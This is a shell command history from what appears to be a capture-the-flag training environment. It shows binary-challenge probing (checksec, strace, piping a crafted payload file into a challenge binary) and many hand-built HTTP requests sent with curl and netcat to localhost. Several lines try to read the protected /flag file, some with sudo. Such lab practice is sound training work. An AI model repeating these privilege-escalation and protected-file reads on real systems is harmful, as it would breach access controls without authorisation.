- 1348  ls -al /etc/ld.so.prelod 
- 1349  ls -al /flag 
- 1350  ipython
- 1351  clear
- 1352  /challenge/toddlerone_level11.0 
- 1353  ipython
- 1354  vim ttt.out
- 1355  ipython
- 1356  vim ttt.out 
- 1357  ipython
- 1358  vim ttt.out
- 1359  checksec /challenge/toddlerone_level11.0 
- 1360  strings /challenge/toddlerone_level11.0 | grep flag
- 1361  ipython
- 1362  eit
- 1363  exit
- 1364  ipython
- 1365  cat ./ttt
- 1366  cat ./ttt.out 
- 1367  ipython
- 1368  cat ./ttt.out 
- 1369  ipython
- 1370  cat /flag 
- 1371  cat ./ttt.out 
- 1372  ipython
- 1373  vim ttt.out 
- 1374  ipython
- 1375  ls -al A
- 1376  ipython
- 1377  cat /flag 
- 1378  ipython
- 1379  vim ttt.out 
- 1380  ipython
- 1381  cat A
- 1382  ls -al /flag
- 1383  ipython
- 1384  ls -al /flag
- 1385  ipython
- 1386  vim ttt.out
- 1387  ipython
- 1388  ls -al /flag
- 1389  ipython
- 1390  vim ttt.out 
- 1391  cat /flag 
- 1392  strace /challenge/toddlerone_level11.0 
- 1393  exit
- 1394  tmux
- 1395  cat /flag 
- 1396  ipython
- 1397  ipytho
- 1398  ipython
- 1399  cat /flag
- 1400  man exit
- 1401  ipython
- 1402  cat ./ttt.out 
- 1403  exit
- 1404  vim ttt.out 
- 1405  ipython
- 1406  cat ttt.out | /challenge/toddlerone_level11.0 
- 1407  cat ttt.out |strace /challenge/toddlerone_level11.0 
- 1408  cat ttt.out | strace /challenge/toddlerone_level11.0 
- 1409  ipython
- 1410  sudo ipython
- 1411  ipython
- 1412  exit
- 1413  tmux
- 1414  cat /flag 
- 1415  sudo cat /flag
- 1416  sudo ipython
- 1417  vim ttt.out 
- 1418  ipython
- 1419  cat ./ttt.out | strace /challenge/toddlerone_level11.0 
- 1420  sudo cat ./ttt.out | strace /challenge/toddlerone_level11.0 
- 1421  ipython
- 1422  sudo cat ./ttt.out | strace /challenge/toddlerone_level11.0 
- 1423  ipython
- 1424  file /challenge/toddlerone_level11.0 
- 1425  checksec /challenge/toddlerone_level11.0 
- 1426  ipython
- 1427  sudo cat ./ttt.out | strace /challenge/toddlerone_level11.0 
- 1428  ipython
- 1429  sudo cat ./ttt.out | strace /challenge/toddlerone_level11.0 
- 1430  ipython
- 1431  sudo cat ./ttt.out | strace /challenge/toddlerone_level11.0 
- 1432  ipython
- 1433  sudo cat ./ttt.out | strace /challenge/toddlerone_level11.0 
- 1434  ipython
- 1435  sudo cat ./ttt.out | strace /challenge/toddlerone_level11.0 
- 1436  ipython
- 1437  sudo cat ./ttt.out | strace /challenge/toddlerone_level11.0 
- 1438  ipython
- 1439  sudo cat ./ttt.out | strace /challenge/toddlerone_level11.0 
- 1440  sudo
- 1441  sudo -i
- 1442  sudo cat ./ttt.out | sudo strace /challenge/toddlerone_level11.0 
- 1443  ipython
- 1444  curl 127.0.0.1
- 1445  nc 127.0.0.1
- 1446  nc 127.0.0.1 -p 80
- 1447  nc =p 80 127.0.0.1 
- 1448  nc -p 80 127.0.0.1 
- 1449  nc 127.0.0.1 :80
- 1450  nc 127.0.0.1:80
- 1451  nc 127.0.0.1 80
- 1452  nc 127.0.0.1 8080
- 1453  nc 127.0.0.1 1234
- 1454  nc 127.0.0.1 80
- 1455  curl -H "Host: example.com" -H "Accept: application/json" http://127.0.0.1
- 1456  curl  -H "Accept: application/json" http://127.0.0.1
- 1457  curl  -H "Accept: application/json" http://127.0.0.1：80
- 1458  curl  -H "Accept: application/json" http://127.0.0.1:80
- 1459  curl -H "Host: example.com" -H "Content-Type: application/json" -d '{"key":"value"}' -X POST http://127.0.0.1
- 1460  curl -H "Host: 127.0.0.1" -H "Content-Type: application/json" -d '{"key":"value"}' -X POST http://127.0.0.1
- 1461  curl -H "Host: example.com" 127.0.0.1
- 1462  curl -H "Host: cdebbef7592a620af98479e08a0d7210" 127.0.0.1
- 1463  echo -e "GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
- 1464  echo -e "GET / HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
- 1465  import requests
- 1466  # The URL you want to send the request to
- 1467  url = 'http://127.0.0.1'
- 1468  # Custom headers
- 1469  headers = {
- 1470  }
- 1471  # Send a GET request
- 1472  response = requests.get(url, headers=headers)
- 1473  # Check the status code of the response
- 1474  if response.status_code == 200:;     print('Success!')
- 1475  else:
- 1476  # Print the content of the response
- 1477  print(response.text)
- 1478  echo -e "GET / HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
- 1479  ipython
- 1480  curl -H "Host: cdebbef7592a620af98479e08a0d7210" 127.0.0.1
- 1481  curl -H "Host: cdebbef7592a620af98479e08a0d7210" 127.0.0.1/37fbdcb0b3cbf8073d2c115f0cb617e9
- 1482  echo -e "GET / HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1/ 80
- 1483  echo -e "GET / HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
- 1484  echo -e "GET /8d83bc12c19ff218bade080ef19799d0 HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" | nc example.com 80
- 1485  echo -e "GET //8d83bc12c19ff218bade080ef19799d0 HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
- 1486  ipython
- 1487  curl -H "Host: cdebbef7592a620af98479e08a0d7210" 127.0.0.1/37fbdcb0b3cbf8073d2c115f0cb617e9
- 1488  curl -H "Host: cdebbef7592a620af98479e08a0d7210" "127.0.0.1//69ebed39 e0d7d556/d7b70214 9182bc23"
- 1489  curl -H "Host: cdebbef7592a620af98479e08a0d7210" "127.0.0.1//69ebed39%20e0d7d556/d7b70214%209182bc23"
- 1490  echo -e "GET //8d83bc12c19ff218bade080ef19799d0 HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
- 1491  echo -e "GET /0f9fe7f8%20d2caa070/8af005e2%206729df4e HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
- 1492  curl 127.0.0.1
- 1493  curl -H "Host: cdebbef7592a620af98479e08a0d7210" "127.0.0.1//69ebed39%20e0d7d556/d7b70214%209182bc23"
- 1494  curl -H "Content-Type: application/json" -d '{"a":"9c9010633f8f6f657749d31471626b07"}' http://127.0.0.1
- 1495  curl -H "Content-Type: application/json" -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1
- 1496  curl -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1
- 1497  curl -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1?a=9c9010633f8f6f657749d31471626b07
- 1498  echo -e "GET /?a= HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
- 1499  echo -e "GET /?a=6712b31cf45e611180886f41430d7fc1 HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
- 1500  curl -H "Content-Type: application/json" -d '{"param1": "value1", "param2": "value2", "param3": "value3"}' http://example.com/resource
- 1501  curl -H "Content-Type: application/json" -d '{"param1": "value1", "param2": "value2", "param3": "value3"}' http://127.0.0.1
- 1502  curl -H "Content-Type: application/json" -d '{"param1": "value1", "param2": "value2", "a": "cf1d40cf99c877446cd2f468b64de27e"}' http://127.0.0.1
- 1503  curl -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1?a=cf1d40cf99c877446cd2f468b64de27e
- 1504  curl -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1?a=cf1d40cf99c877446cd2f468b64de27e?b=816387d5%209e3abf04&adae132f#95650956
- 1505  curl -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1?a=cf1d40cf99c877446cd2f468b64de27e?b=816387d5%209e3abf04%26adae132f#95650956
- 1506  curl -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1?a=cf1d40cf99c877446cd2f468b64de27e%26b=816387d5%209e3abf04%26adae132f#95650956
- 1507  ipython
- 1508  curl -F "a=9c9010633f8f6f657749d31471626b07" http%3A127.0.0.1/%3Fa%3Dcf1d40cf99c877446cd2f468b64de27e%26b%3D816387d5%25209e3abf04%26adae132f%2395650956
- 1509  curl -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1/%3Fa%3Dcf1d40cf99c877446cd2f468b64de27e%26b%3D816387d5%25209e3abf04%26adae132f%2395650956
- 1510  curl -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1/?a=cf1d40cf99c877446cd2f468b64de27e&b=816387d5%25209e3abf04%26adae132f%2395650956
- 1511  curl -F "a=9c9010633f8f6f657749d31471626b07" "http://127.0.0.1/?a=cf1d40cf99c877446cd2f468b64de27e&b=816387d5%25209e3abf04%26adae132f%2395650956"
- 1512  curl --get --data-urlencode "a=" --data-urlencode "b=value2" --data-urlencode "param3=value3" "http://127.0.0.1"
- 1513  curl --get --data-urlencode "a=cf1d40cf99c877446cd2f468b64de27e" --data-urlencode "b=value2" --data-urlencode "param3=value3" "http://127.0.0.1"
- 1514  curl --get --data-urlencode "a=cf1d40cf99c877446cd2f468b64de27e" --data-urlencode "b=816387d5 9e3abf04&adae132f#95650956" --data-urlencode "param3=value3" "http://127.0.0.1"
- 1515  echo -e "GET /path?arg1=value1&arg2=value2 HTTP/1.1\nHost: example.com\n\n" | nc 127.0.0.1 80
- 1516  echo -e "GET /?a=28d7d0f6c9bf6acf4374b3a1dd19a227&arg2=value2 HTTP/1.1\nHost: example.com\n\n" | nc 127.0.0.1 80
- 1517  echo -e "GET /?a=28d7d0f6c9bf6acf4374b3a1dd19a227&arg2=cf8571bb 4026ba7c&6989591e#c2459f05 HTTP/1.1\nHost: example.com\n\n" | nc 127.0.0.1 80
- 1518  echo -e "GET /?a=28d7d0f6c9bf6acf4374b3a1dd19a227&b=cf8571bb 4026ba7c&6989591e#c2459f05 HTTP/1.1\nHost: example.com\n\n" | nc 127.0.0.1 80
- 1519  echo -e "GET /?a=28d7d0f6c9bf6acf4374b3a1dd19a227&b=cf8571bb%204026ba7c%266989591e%23c2459f05 HTTP/1.1\nHost: example.com\n\n" | nc 127.0.0.1 80
- 1520  curl -F "key1=value1" -F "key2=value2" -F "file=@/path/to/file.txt" http://127.0.0.1
- 1521  curl -F "key1=value1" -F "key2=value2" http://127.0.0.1
- 1522  curl -F "a=9326f1a32868fbac1dc8397a59d0a7ba" -F "key2=value2" http://127.0.0.1
- 1523  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\nConnection: close\r\n\r\nkey1=value1&key2=value2" | nc 127.0.0.1 80
- 1524  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Length: 228\r\nConnection: close\r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file.txt\"\r\nContent-Type: text/plain\r\n\r\nfile content\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--" | nc 127.0.0.1 80
- 1525  echo -e "GET /?a=28d7d0f6c9bf6acf4374b3a1dd19a227&b=cf8571bb%204026ba7c%266989591e%23c2459f05 HTTP/1.1\nHost: example.com\n\n" | nc 127.0.0.1 80
- 1526  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: multipart/form-data; a=24530f04e6c7fb7d04d059973d804627\r\nContent-Type: text/plain\r\n\r\nfile content\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--" | nc 127.0.0.1 80
- 1527  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\nConnection: close\r\n\r\na=24530f04e6c7fb7d04d059973d804627" | nc 127.0.0.1 80
- 1528  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 34\r\nConnection: close\r\n\r\na=24530f04e6c7fb7d04d059973d804627" | nc 127.0.0.1 80
- 1529  curl -F "a=9326f1a32868fbac1dc8397a59d0a7ba" -F "key2=value2" http://127.0.0.1
- 1530  curl -F "a=5e0574f48a7c9f6a6dd36921c6b6b45e" -F "key2=value2" http://127.0.0.1
- 1531  curl -F "a=5e0574f48a7c9f6a6dd36921c6b6b45e" -F "key2=8dc3460c%207b9bdc4d%2613f96c76%235a96cb35" http://127.0.0.1
- 1532  curl -F "a=5e0574f48a7c9f6a6dd36921c6b6b45e" -F "b=8dc3460c%207b9bdc4d%2613f96c76%235a96cb35" http://127.0.0.1
- 1533  curl -F "a=5e0574f48a7c9f6a6dd36921c6b6b45e" -F "b=8dc3460c 7b9bdc4d&13f96c76#5a96cb35" http://127.0.0.1
- 1534  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 100\r\nConnection: close\r\n\r\na=24530f04e6c7fb7d04d059973d804627&b=c" | nc 127.0.0.1 80
- 1535  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\nConnection: close\r\n\r\na=24530f04e6c7fb7d04d059973d804627&b=c" | nc 127.0.0.1 80
- 1536  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=c" | nc 127.0.0.1 80
- 1537  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 50\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=c" | nc 127.0.0.1 80
- 1538  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 40\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=c" | nc 127.0.0.1 80
- 1539  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 34\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=c" | nc 127.0.0.1 80
- 1540  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 34\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
- 1541  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 40\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
- 1542  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 72\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
- 1543  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 95\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
- 1544  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 90\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
- 1545  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 85\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
- 1546  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 82\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
- 1547  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 76\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
- 1548  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 72\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
- 1549  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 72\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a%26a8845ddf#f97a25aa" | nc 127.0.0.1 80
- 1550  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 74\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a%26a8845ddf#f97a25aa" | nc 127.0.0.1 80
- 1551  curl -H "Content-Type: application/json" -d '{"key1":"value1", "key2":"value2"}' http://127.0.0.1/resource
- 1552  curl -H "Content-Type: application/json" -d '{"key1":"ea4a344f52b43f62880c8340c6add549", "key2":"value2"}' http://127.0.0.1/resource
- 1553  curl -H "Content-Type: application/json" -d '{"a":"ea4a344f52b43f62880c8340c6add549", "key2":"value2"}' http://127.0.0.1/resource
- 1554  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 34\r\nConnection: close\r\n\r\n{\"key1\":\"value1\", \"key2\":\"value2\"}" | nc 127.0.0.1 80
- 1555  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 34\r\nConnection: close\r\n\r\n{\"key1\":\"998601274c926de3a6e92a4f1dced7d5\", \"key2\":\"value2\"}" | nc 127.0.0.1 80
- 1556  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 54\r\nConnection: close\r\n\r\n{\"key1\":\"998601274c926de3a6e92a4f1dced7d5\", \"key2\":\"value2\"}" | nc 127.0.0.1 80
- 1557  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 60\r\nConnection: close\r\n\r\n{\"key1\":\"998601274c926de3a6e92a4f1dced7d5\", \"key2\":\"value2\"}" | nc 127.0.0.1 80
- 1558  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 57\r\nConnection: close\r\n\r\n{\"a\":\"998601274c926de3a6e92a4f1dced7d5\", \"key2\":\"value2\"}" | nc 127.0.0.1 80
- 1559  curl -H "Content-Type: application/json" -d '{
- 1560      "name": "John Doe",
- 1561      "age": 30,
- 1562      "address": {
- 1563          "street": "123 Main St",
- 1564          "city": "Anytown",
- 1565          "state": "CA",
- 1566          "zip": "12345"
- 1567      },
- 1568      "hobbies": ["reading", "hiking", "coding"]
- 1569  }' http://127.0.0.1/resource
- 1570  curl -H "Content-Type: application/json" -d '{
- 1571      
- 1572  }' http://127.0.0.1/resource
- 1573  curl -H "Content-Type: application/json" -d '{
- 1574  "a" : "a1a250aee832d2a326b3c1e2561b99b1"    
- 1575  }' http://127.0.0.1/resource
- 1576  curl -H "Content-Type: application/json" -d '{
- 1577  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":"{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65&69200f16#7c000827']}"   
- 1578  }' http://127.0.0.1/resource
- 1579  curl -H "Content-Type: application/json" -d '{
- 1580  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65&69200f16#7c000827']}
- 1581  }' http://127.0.0.1/resource
- 1582  curl -H "Content-Type: application/json" -d '{
- 1583  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65\&69200f16#7c000827']}
- 1584  }' http://127.0.0.1/resource
- 1585  curl -H "Content-Type: application/json" -d '{
- 1586  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65%2669200f16#7c000827']}
- 1587  }' http://127.0.0.1/resource
- 1588  curl -H "Content-Type: application/json" -d '{
- 1589  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65&69200f16#7c000827']}
- 1590  }' http://127.0.0.1/resource
- 1591  curl -H "Content-Type: application/json" -d '{
- 1592  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65%2669200f16#7c000827']}
- 1593  }' http://127.0.0.1/resource
- 1594  curl -H "Content-Type: application/json" -d '{
- 1595  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":"{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65%2669200f16#7c000827']}"
- 1596  }' http://127.0.0.1/resource
- 1597  curl -H "Content-Type: application/json" -d '{
- 1598  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":"{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65&69200f16#7c000827']}"
- 1599  }' http://127.0.0.1/resource
- 1600  curl -H "Content-Type: application/json" -d '{
- 1601  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":"{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65&69200f16#7c000827']}"
- 1602  }' http://127.0.0.1/resource
- 1603  curl -H "Content-Type: application/json" -d '{"a" : "a1a250aee832d2a326b3c1e2561b99b1","b":"{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65&69200f16#7c000827']}"}' http://127.0.0.1/resource
- 1604  exit
- 1605  curl -H "Content-Type: application/json" -d '{"key1":"ea4a344f52b43f62880c8340c6add549", "key2":"value2"}' http://127.0.0.1/resource
- 1606  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "key2":"value2"}' http://127.0.0.1/resource
- 1607  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65\&69200f16#7c000827']}}' http://127.0.0.1/resource
- 1608  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65%2669200f16#7c000827']}}' http://127.0.0.1/resource
- 1609  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569\ 26852b65&69200f16#7c000827']}}' http://127.0.0.1/resource
- 1610  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569%2026852b65%2669200f16#7c000827']}}' http://127.0.0.1/resource
- 1611  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":"{'c': '64d4a626', 'd': ['9a35362a', '8b77a569%2026852b65%2669200f16#7c000827']}"}' http://127.0.0.1/resource
- 1612  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65\&69200f16#7c000827']}}' http://127.0.0.1/resource
- 1613  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569\ 26852b65\&69200f16#7c000827']}}' http://127.0.0.1/resource
- 1614  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569\ 26852b65\&69200f16#7c000827']}}' http://127.0.0.1
- 1615  clear
- 1616  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569\ 26852b65\&69200f16#7c000827']}}' http://127.0.0.1
- 1617  curl -H "Content-Type: application/json" -d '{"key":"value with &"}' http://127.0.0.1/resource
- 1618  curl -H "Content-Type: application/json" -d '{"a":"value with &"}' http://127.0.0.1/resource
- 1619  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', "8b77a569\ 26852b65&69200f16#7c000827"]}}' http://127.0.0.1
- 1620  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', "8b77a569 26852b65&69200f16#7c000827"]}}' http://127.0.0.1
- 1621  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{"c": "64d4a626", "d": ["9a35362a", "8b77a569 26852b65&69200f16#7c000827"]}}' http://127.0.0.1
- 1622  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 57\r\nConnection: close\r\n\r\n{\"a\":\"998601274c926de3a6e92a4f1dced7d5\", \"key2\":\"value2\"}" | nc 127.0.0.1 80
- 1623  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 57\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"key2\":\"value2\"}" | nc 127.0.0.1 80
- 1624  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 57\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}\"}" | nc 127.0.0.1 80
- 1625  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 57\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"key2\":\"value2\"}" | nc 127.0.0.1 80
- 1626  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 123\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}\"}" | nc 127.0.0.1 80
- 1627  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 123\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46\ e7af746d\&7f470465#7696ca89']}\"}" | nc 127.0.0.1 80
- 1628  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 123\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46%20e7af746d%267f470465#7696ca89']}\"}" | nc 127.0.0.1 80
- 1629  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 125\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46\ e7af746d\&7f470465#7696ca89']}\"}" | nc 127.0.0.1 80
- 1630  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 127\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46%20e7af746d%267f470465#7696ca89']}\"}" | nc 127.0.0.1 80
